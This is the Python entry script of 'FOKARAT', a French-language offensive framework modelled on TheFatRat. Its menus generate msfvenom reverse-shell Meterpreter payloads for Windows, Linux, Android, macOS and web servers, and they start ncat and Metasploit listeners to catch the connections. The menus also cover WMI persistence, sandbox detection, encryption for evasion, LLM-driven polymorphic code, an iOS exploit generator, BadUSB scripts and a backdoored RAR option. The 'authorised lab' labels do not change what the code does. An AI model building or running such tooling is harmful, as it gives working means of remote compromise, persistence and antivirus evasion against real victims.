#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import argparse
import subprocess
import time
import shutil

from core.config import Config

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

RESET = "\033[0m"
BOLD = "\033[1m"
CYAN = "\033[36m"
YELLOW = "\033[33m"
GREEN = "\033[32m"
RED = "\033[31m"
MAGENTA = "\033[35m"
BLUE = "\033[34m"


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def animate_boot():
    clear_screen()
    sequence = [
        ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.28),
        ("[BOOT 02] Chargement des modules payloads, listeners et IA...", 0.28),
        ("[BOOT 03] Vérification des services externes...", 0.28),
        ("[BOOT 04] Préparation de l'interface de contrôle...", 0.28),
        ("[BOOT 05] Système prêt pour la session...", 0.4),
    ]

    for message, delay in sequence:
        print(f"{BOLD}{MAGENTA}{message}{RESET}")
        time.sleep(delay)

    print(f"{BOLD}{CYAN}")
    print(" ███████╗ ██████╗ ██████╗  █████╗  ██████╗ █████╗  ██████╗██╗  ██╗")
    print(" ██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝██║ ██╔╝")
    print(" █████╗  ██║   ██║██████╔╝███████║██║   ██║███████║██║     █████╔╝ ")
    print(" ██╔══╝  ██║   ██║██╔══██╗██╔══██║██║   ██║██╔══██║██║     ██╔═██╗ ")
    print(" ███████╗╚██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██║╚██████╗██║  ██╗")
    print(" ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝")
    print(f"{RESET}")
    print(f"{BOLD}{YELLOW}                  FOKARAT{RESET}")
    print(f"{BOLD}{GREEN}      Framework autonomique • Payloads • Mobile • IA • Exploits{RESET}")
    time.sleep(0.8)


def print_fokarat_ascii():
    print(r'''
                 ___   ___   ___   ___
              .-"""-. .-"""-. .-"""-.
             /  .-.  \  .-.  \  .-.  \
             |  | |  |  | |  |  | |  |
             |  |_|  |  |_|  |  |_|  |
              `-._.-'    `-._.-'    `-._.-'
                   ~~~   ~~~   ~~~

             ███████╗ ██████╗  █████╗ ██╗  ██╗███████╗
             ██╔════╝██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
             █████╗  ██║   ██║███████║█████╔╝ █████╗  
             ██╔══╝  ██║   ██║██╔══██║██╔═██╗ ██╔══╝  
             ███████╗╚██████╔╝██║  ██║██║  ██╗███████╗
             ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝

                    F O K A R A T
            Framework Offensive • Payloads • Reverse • Fire
             Developed by: LWANO AMISSI BLANCHARD FOKAS
    ''')


def show_dashboard(config):
    print(f"\n{BOLD}{CYAN}=== Tableau de bord FOKARAT ==={RESET}")
    print(f"{GREEN}Projet : FOKARAT Premium Research Suite{RESET}")
    print(f"{GREEN}Cadre : Thèse / BAC / démonstration autorisée{RESET}")
    print(f"{GREEN}LHOST : {config.get('kali_ip', '127.0.0.1')}{RESET}")
    print(f"{GREEN}LPORT : {config.get('kali_port', 4444)}{RESET}")
    print(f"{GREEN}Mode réseau : {config.get('network_mode', 'tcp')}{RESET}")
    print(f"{GREEN}BadUSB : prêt (mode lab sûr){RESET}")
    print(f"{GREEN}Listeners : gestion centralisée{RESET}")
    print(f"{GREEN}Payloads : Python / C++ / MSFVenom{RESET}")
    print(f"{GREEN}IA : assistant local disponible{RESET}")


def show_main_menu():
    clear_screen()
    print_fokarat_ascii()
    print(f"{BOLD}{MAGENTA}      VERSION PREMIUM • THÈSE / BAC • LABORATOIRE AUTORISÉ{RESET}")
    show_dashboard(Config())
    print(f"{BOLD}{CYAN}        [01]  Génération de payloads{RESET}")
    print(f"{BOLD}{CYAN}        [02]  Reverse handlers{RESET}")
    print(f"{BOLD}{CYAN}        [03]  Listeners & serveurs{RESET}")
    print(f"{BOLD}{CYAN}        [04]  Persistance / WMI{RESET}")
    print(f"{BOLD}{CYAN}        [05]  Évitement / sandbox / Speck{RESET}")
    print(f"{BOLD}{CYAN}        [06]  Mobile / Android / iOS{RESET}")
    print(f"{BOLD}{MAGENTA}        [07]  Assistant IA / polymorphisme{RESET}")
    print(f"{BOLD}{MAGENTA}        [08]  BadUSB / DuckyScript (lab-safe){RESET}")
    print(f"{BOLD}{MAGENTA}        [09]  Interface graphique{RESET}")
    print(f"{BOLD}{YELLOW}        [10]  Ouvrir msfconsole{RESET}")
    print(f"{BOLD}{YELLOW}        [11]  Searchsploit{RESET}")
    print(f"{BOLD}{YELLOW}        [12]  Paramètres réseau{RESET}")
    print(f"{BOLD}{RED}        [13]  Nettoyage des listeners{RESET}")
    print(f"{BOLD}{RED}        [14]  Aide rapide{RESET}")
    print(f"{BOLD}{RED}        [15]  Crédits{RESET}")
    print(f"{BOLD}{RED}        [16]  Quitter{RESET}")
    print(f"{YELLOW}\n ┌─[FOKARAT]──[~]─[menu]:{RESET}")


def fatrat_payload_menu(config):
    print(f"{YELLOW}\n  ====================================================================={RESET}")
    print(f"{BOLD}{CYAN}  ___________ {RESET}")
    print(f"{BOLD}{CYAN} |           |======[***       ____                _{RESET}")
    print(f"{BOLD}{CYAN} |  MSFVENOM  \              / ___|_ __ ___  ____| |_ ___  _ __{RESET}")
    print(f"{BOLD}{CYAN} |_____________\_______      | |   | '__/ _ \/ _  | __/ _ \| '__|{RESET}")
    print(f"{BOLD}{CYAN} |==[v1.3 >]===========\     | |___| | |  __/ (_| | || (_) | |   {RESET}")
    print(f"{BOLD}{CYAN} |______________________\     \____|_|  \___|\____|\__\___/|_|    {RESET}")
    print(f"{BOLD}{CYAN}  \(@)(@)(@)(@)(@)(@)(@)/ {RESET}")
    print(f"{BOLD}{CYAN}  ********************* {RESET}")
    print(f"{YELLOW}  ====================================================================={RESET}")
    print(f"{YELLOW} |                             Created by  LWANO AMISSI BLANCHARD FOKAS  |{RESET}")
    print(f"{YELLOW}  ====================================================================={RESET}")
    print(f"{BOLD}{GREEN}        [1]  LINUX >> FOKARAT.elf{RESET}")
    print(f"{BOLD}{GREEN}        [2]  WINDOWS >> FOKARAT.exe{RESET}")
    print(f"{BOLD}{GREEN}        [3]  SIGNED ANDROID >> FOKARAT.apk{RESET}")
    print(f"{BOLD}{GREEN}        [4]  MAC >> FOKARAT.macho{RESET}")
    print(f"{BOLD}{GREEN}        [5]  PHP >> FOKARAT.php{RESET}")
    print(f"{BOLD}{GREEN}        [6]  ASP >> FOKARAT.asp{RESET}")
    print(f"{BOLD}{GREEN}        [7]  JSP >> FOKARAT.jsp{RESET}")
    print(f"{BOLD}{GREEN}        [8]  WAR >> FOKARAT.war{RESET}")
    print(f"{BOLD}{GREEN}        [9]  Python >> FOKARAT.py{RESET}")
    print(f"{BOLD}{GREEN}        [10] Bash >> FOKARAT.sh{RESET}")
    print(f"{BOLD}{GREEN}        [11] Perl >> FOKARAT.pl{RESET}")
    print(f"{BOLD}{GREEN}        [12] doc >> Microsoft.doc (not macro attack){RESET}")
    print(f"{BOLD}{GREEN}        [13] rar >> backdoor.rar (Winrar old version){RESET}")
    print(f"{BOLD}{GREEN}        [14] dll >> FOKARAT.dll{RESET}")
    print(f"{BOLD}{GREEN}        [15] Back to Menu{RESET}")
    print(f"{YELLOW}\n ┌─[FOKARAT]──[~]─[creator]:{RESET}")

    lhost = config.get("kali_ip", "192.168.1.100")
    lport = config.get("kali_port", 4444)
    print(f"{GREEN} Your local IPV4 address is : {lhost}{RESET}")
    print(f"{GREEN} Set LHOST IP: {lhost}{RESET}")
    print(f"{GREEN} Set LPORT: {lport}{RESET}")
    print(f"{YELLOW}\n Choose Payload :{RESET}")

    try:
        choice = safe_input(f"{BOLD}{CYAN}Payload > {RESET}")
    except EOFError:
        return

    if choice == "15":
        return

    payloads = {
        "1": "linux/x64/meterpreter/reverse_tcp",
        "2": "windows/meterpreter/reverse_tcp",
        "3": "android/meterpreter/reverse_tcp",
        "4": "osx/x64/meterpreter/reverse_tcp",
        "5": "php/meterpreter/reverse_tcp",
        "6": "asp/meterpreter/reverse_tcp",
        "7": "java/jsp_shell_reverse_tcp",
        "8": "java/jsp_shell_reverse_tcp",
        "9": "python/meterpreter/reverse_tcp",
        "10": "cmd/unix/reverse_bash",
        "11": "cmd/unix/reverse_perl",
        "12": "windows/meterpreter/reverse_tcp",
        "13": "windows/meterpreter/reverse_tcp",
        "14": "windows/meterpreter/reverse_tcp",
    }

    payload = payloads.get(choice, "windows/meterpreter/reverse_tcp")
    if shutil.which("msfvenom") is None:
        print(f"{RED}[!] msfvenom non installé. Le framework utilise le mode local de démonstration.{RESET}")
        print(f"{GREEN}[+] Paramètres enregistrés : LHOST={lhost}, LPORT={lport}, PAYLOAD={payload}{RESET}")
        return

    output_name = f"fokarat_{choice}_{lport}"
    cmd = [
        "msfvenom",
        "-p", payload,
        "LHOST=" + str(lhost),
        "LPORT=" + str(lport),
        "-f", "elf" if choice in ("1","9","10") else "exe" if choice in ("2","12","13","14") else "raw",
        "-o", output_name,
    ]
    print(f"{GREEN}[+] Commande générée : {' '.join(cmd)}{RESET}")
    try:
        subprocess.run(cmd, check=False)
    except Exception as exc:
        print(f"{RED}[!] Erreur pendant la génération : {exc}{RESET}")


def payload_menu(config):
    while True:
        print(f"\n{YELLOW}--- Payloads ---{RESET}")
        print("1. Générer payload Python")
        print("2. Générer payload C++")
        print("3. Afficher config")
        print("4. Reverse Handler (Metasploit)")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}Payload > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        if choice == "1":
            from modules.payload_generators.python_gen import PythonPayloadGenerator
            print("[+] Génération payload Python...")
            print(PythonPayloadGenerator().run(config))
        elif choice == "2":
            from modules.payload_generators.cpp_gen import CppPayloadGenerator
            print("[+] Génération payload C++...")
            print(CppPayloadGenerator().run(config))
        elif choice == "3":
            print(config.data)
        elif choice == "4":
            reverse_menu(config)
        else:
            print("Choix invalide.")


def mobile_menu(config):
    while True:
        print(f"\n{YELLOW}--- Mobile ---{RESET}")
        print("1. Générer APK Android")
        print("2. Générer exploit iOS (POC)")
        print("3. Afficher config")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}Mobile > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        if choice == "1":
            from mobile.android_gen import AndroidPayloadGenerator
            print("[+] Génération APK Android...")
            print(AndroidPayloadGenerator().run(config))
        elif choice == "2":
            from mobile.ios_gen import IosZeroClickGenerator
            print("[+] Génération exploit iOS...")
            print(IosZeroClickGenerator().run(config))
        elif choice == "3":
            print(config.data)
        else:
            print("Choix invalide.")


def listener_menu(config):
    while True:
        print(f"\n{YELLOW}--- Listeners ---{RESET}")
        print("1. Démarrer listener ncat")
        print("2. Démarrer listener Metasploit")
        print("3. Démarrer serveur HTTP")
        print("4. Arrêter tous les listeners")
        print("5. Reverse Handler (Metasploit)")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}Listener > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        if choice == "1":
            from modules.listeners.listener_manager import ListenerManager
            port = int(config.get("kali_port", 4444))
            proc = ListenerManager().start_ncat(port)
            print("ncat:" if proc else "ncat non démarré")
        elif choice == "2":
            from modules.listeners.listener_manager import ListenerManager
            lhost = config.get("kali_ip", "192.168.1.100")
            lport = int(config.get("kali_port", 4444))
            proc = ListenerManager().start_msf(lhost, lport)
            print("msf:" if proc else "msf non démarré")
        elif choice == "3":
            from modules.listeners.listener_manager import ListenerManager
            port = int(config.get("http_server_port", 8080))
            payload = "payload_python"
            if os.path.exists(payload):
                ListenerManager().start_http_server(port, payload)
                print("Serveur HTTP démarré sur le port", port)
            else:
                print("Aucun payload disponible. Générez un payload d'abord.")
        elif choice == "4":
            from modules.listeners.listener_manager import ListenerManager
            ListenerManager().stop_all()
            print("Tous les listeners arrêtés.")
        elif choice == "5":
            reverse_menu(config)
        else:
            print("Choix invalide.")


def persistence_menu(config):
    while True:
        print(f"\n{YELLOW}--- Persistence ---{RESET}")
        print("1. Installer persistance WMI")
        print("2. Afficher config")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}Persistence > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        if choice == "1":
            from modules.persistence.wmi_persist import WMIPersistence
            payload = safe_input("Chemin du payload > ")
            if not payload:
                print("Chemin vide.")
                continue
            config.set("payload_path", payload)
            print(WMIPersistence().run(config))
        elif choice == "2":
            print(config.data)
        else:
            print("Choix invalide.")


def evasion_menu(config):
    while True:
        print(f"\n{YELLOW}--- Évitement & IA ---{RESET}")
        print("1. Tester sandbox")
        print("2. Chiffrer un fichier Speck")
        print("3. Générer code polymorphe")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}Evasion > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        if choice == "1":
            from modules.obfuscators.sandbox_detector import SandboxDetector
            print(SandboxDetector.is_sandbox())
        elif choice == "2":
            path = safe_input("Chemin fichier > ")
            if not os.path.exists(path):
                print("Fichier introuvable.")
                continue
            from modules.obfuscators.speck_cipher import speck_encrypt
            with open(path, 'rb') as f:
                data = f.read()
            out = path + ".enc"
            with open(out, 'wb') as f:
                f.write(speck_encrypt(data, b'16bytekeyforSpeck'))
            print("Fichier chiffré :", out)
        elif choice == "3":
            from ai.polymorph_llm import PolymorphLLM
            source = safe_input("Chemin du fichier source Python > ")
            config.set("source_file", source)
            print(PolymorphLLM().run(config))
        else:
            print("Choix invalide.")


def settings_menu(config):
    while True:
        print(f"\n{YELLOW}--- Configuration ---{RESET}")
        print("1. Afficher config")
        print("2. Modifier LHOST")
        print("3. Modifier LPORT")
        print("4. Modifier le mode réseau (tcp/http/https)")
        print("5. Sauvegarder")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}Config > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        if choice == "1":
            print(config.data)
        elif choice == "2":
            new_ip = safe_input("LHOST > ") or config.get("kali_ip", "192.168.1.100")
            config.set("kali_ip", new_ip)
        elif choice == "3":
            new_port = safe_input("LPORT > ") or str(config.get("kali_port", 4444))
            config.set("kali_port", int(new_port))
        elif choice == "4":
            mode = safe_input("Mode réseau [tcp/http/https] > ").lower() or config.get("network_mode", "tcp")
            if mode not in ("tcp", "http", "https"):
                print("Mode invalide. Utilise tcp, http ou https.")
                continue
            config.set("network_mode", mode)
            config.set("network_protocol", mode)
            print(f"Mode réseau défini sur: {mode}")
        elif choice == "5":
            config.save()
            print("Configuration sauvegardée.")
        else:
            print("Choix invalide.")


def reverse_menu(config):
    while True:
        print(f"\n{YELLOW}--- Reverse Handler (Metasploit) ---{RESET}")
        print("1. Démarrer un reverse handler TCP")
        print("2. Démarrer un reverse handler HTTP")
        print("3. Démarrer un reverse handler HTTPS")
        print("4. Afficher config")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}Reverse > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        if choice == "1":
            from modules.listeners.listener_manager import ListenerManager
            lhost = config.get("kali_ip", "192.168.1.100")
            lport = int(config.get("kali_port", 4444))
            print("[+] Démarrage du handler Metasploit reverse TCP...")
            print(ListenerManager().start_msf(lhost, lport, payload="windows/x64/meterpreter/reverse_tcp"))
        elif choice == "2":
            from modules.listeners.listener_manager import ListenerManager
            lhost = config.get("kali_ip", "192.168.1.100")
            port = int(config.get("http_server_port", 8080))
            print("[+] Démarrage du handler HTTP local via MSF...")
            print(ListenerManager().start_msf(lhost, port, payload="windows/x64/meterpreter/reverse_http"))
        elif choice == "3":
            from modules.listeners.listener_manager import ListenerManager
            lhost = config.get("kali_ip", "192.168.1.100")
            port = int(config.get("http_server_port", 8443))
            print("[+] Démarrage du handler HTTPS local via MSF...")
            print(ListenerManager().start_msf(lhost, port, payload="windows/x64/meterpreter/reverse_https"))
        elif choice == "4":
            print(config.data)
        else:
            print("Choix invalide.")


def badusb_menu(config):
    while True:
        print(f"\n{YELLOW}--- BadUSB (mode lab sûr) ---{RESET}")
        print("1. Générer un script DuckyScript de démonstration")
        print("2. Réafficher la configuration BadUSB")
        print("0. Retour")
        try:
            choice = safe_input(f"{BOLD}{CYAN}BadUSB > {RESET}")
        except EOFError:
            return

        if choice == "0":
            return
        elif choice == "1":
            from modules.injectors.badusb_gen import BadUSBGenerator
            result = BadUSBGenerator().run(config)
            print(f"{GREEN}[+] {result}{RESET}")
        elif choice == "2":
            print(config.data)
        else:
            print("Choix invalide.")


def launch_gui():
    try:
        import gui
        app = gui.FrameworkGUI()
        app.mainloop()
    except ModuleNotFoundError as exc:
        print(f"{RED}[!] Impossible de lancer le GUI : dépendance manquante ({exc}).{RESET}")
        print(f"{GREEN}[+] Installe les dépendances : pip install -r Framework/Framework/requirements.txt{RESET}")
    except Exception as exc:
        print(f"{RED}[!] Erreur au démarrage du GUI : {exc}{RESET}")


def launch_cli():
    from core.config import Config
    config = Config()
    animate_boot()

    while True:
        show_main_menu()
        try:
            choice = safe_input(f"{BOLD}{YELLOW}Choix > {RESET}")
        except EOFError:
            print(f"\n{GREEN}Sortie du framework.{RESET}")
            return

        if choice in ("0", "16"):
            print(f"{GREEN}Au revoir.{RESET}")
            return
        elif choice == "1":
            fatrat_payload_menu(config)
        elif choice == "2":
            reverse_menu(config)
        elif choice == "3":
            listener_menu(config)
        elif choice == "4":
            persistence_menu(config)
        elif choice == "5":
            evasion_menu(config)
        elif choice == "6":
            mobile_menu(config)
        elif choice == "7":
            from ai.polymorph_llm import PolymorphLLM
            print("[+] Assistant IA / polymorphisme disponible.")
            print(PolymorphLLM().get_metadata())
        elif choice == "8":
            badusb_menu(config)
        elif choice == "9":
            launch_gui(); return
        elif choice == "10":
            if shutil.which("msfconsole"):
                subprocess.Popen(["msfconsole"])
                print(f"{GREEN}[+] Ouverture de msfconsole...{RESET}")
            else:
                print(f"{RED}[!] msfconsole n'est pas installé.{RESET}")
        elif choice == "11":
            if shutil.which("searchsploit"):
                subprocess.run(["searchsploit"], check=False)
            else:
                print(f"{RED}[!] searchsploit n'est pas installé.{RESET}")
        elif choice == "12":
            settings_menu(config)
        elif choice == "13":
            print(f"{YELLOW}[!] Nettoyage des listeners locaux...{RESET}")
            try:
                from modules.listeners.listener_manager import ListenerManager
                ListenerManager().stop_all()
            except Exception:
                pass
            print(f"{GREEN}[+] Nettoyage terminé.{RESET}")
        elif choice == "14":
            show_help()
        elif choice == "15":
            show_credits()
        else:
            print("Choix invalide.")


def safe_input(prompt):
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print(f"\n{YELLOW}[!] Entrée terminal interrompue. Retour au menu principal.{RESET}")
        raise


def show_help():
    print(f"{GREEN}\nFOKARAT - Aide rapide{RESET}")
    print("- 1 : générer un payload via msfvenom")
    print("- 2 : générer un payload Python/C++")
    print("- 7 : ouvrir l'interface graphique")
    print("- 8 : générer un script BadUSB de démonstration")
    print("- 12 : configurer LHOST/LPORT")
    print("- 9 : ouvrir msfconsole")
    print("- Utilise automatiquement l'IP locale si LHOST est vide")


def show_credits():
    print(f"{YELLOW}\nFOKARAT{RESET}")
    print("Framework autonome inspiré du style TheFatRat")
    print("Développé par : LWANO AMISSI BLANCHARD FOKAS")
    print("Module de travail : Payloads • Mobile • IA • Réseau • Reverse handlers")


def main():
    parser = argparse.ArgumentParser(
        description="FOKARAT - Framework Doctoral - Cybersécurité Offensive v2.0"
    )
    parser.add_argument("--gui", action="store_true", help="Lancer l'interface graphique")
    parser.add_argument("--cli", action="store_true", help="Lancer le mode terminal interactif")
    args = parser.parse_args()

    if args.gui:
        launch_gui()
    elif args.cli or not any([args.gui, args.cli]):
        launch_cli()


if __name__ == "__main__":
    main()